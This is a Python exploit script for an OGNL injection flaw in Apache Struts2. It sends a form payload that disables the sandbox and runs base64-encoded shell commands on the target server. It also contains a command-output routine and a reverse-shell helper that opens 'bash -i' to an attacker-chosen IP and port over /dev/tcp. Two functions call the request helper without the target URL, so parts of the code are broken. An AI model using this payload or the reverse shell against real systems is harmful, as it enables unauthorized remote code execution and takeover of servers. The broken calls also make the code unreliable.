import requests
import json
import base64
import sys

timeout = 30


def gocmd(url, cmd):
    cmdstr = str(base64.b64encode(cmd.encode("utf-8")), "utf-8")
    formdata = {
        "id": "%{(#instancemanager=#application[\"org.apache.tomcat.InstanceManager\"]).(#stack=#attr[\"com.opensymphony.xwork2.util.ValueStack.ValueStack\"]).(#bean=#instancemanager.newInstance(\"org.apache.commons.collections.BeanMap\")).(#bean.setBean(#stack)).(#context=#bean.get(\"context\")).(#bean.setBean(#context)).(#macc=#bean.get(\"memberAccess\")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance(\"java.util.HashSet\")).(#bean.put(\"excludedClasses\",#emptyset)).(#bean.put(\"excludedPackageNames\",#emptyset)).(#arglist=#instancemanager.newInstance(\"java.util.ArrayList\")).(#arglist.add(\"bash -c {echo," + cmdstr + "}|{base64,-d}|{bash,-i}\")).(#execute=#instancemanager.newInstance(\"freemarker.template.utility.Execute\")).(#execute.exec(#arglist))}",
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"}
    response = requests.post(url, data=formdata, headers=headers, timeout=timeout)
    return response


def verify():
    cmd = "echo sky2 && echo woai^dabomei niai$1pinru && echo sky2"
    res = gocmd(cmd)
    outdata = res.text.split('sky2')[1]
    if res.status_code == 200 and "niaipinru" in outdata:
        return "vulnerable, target is linux"
    elif res.status_code == 200 and "woaidabomei" in res.text:
        return "vulnerable, target is windows"


def cmd_execute():
    url = sys.argv[1]
    cmd = sys.argv[2]
    res = gocmd(url, "echo sky2 && a=$(" + cmd +'|base64 -i|tr -d ["\n"]'+" )&& echo $a && echo sky2")
    outdata = res.text.split('sky2')[1]
    result = base64.b64decode(outdata)
    print(str(result, encoding = "utf-8"))

def _get_shell(ip,port):
    cmd = '''bash -i >& /dev/tcp/{0}/{1} 0>&1'''.format(ip, port)
    gocmd(cmd)
    print(cmd)

cmd_execute()

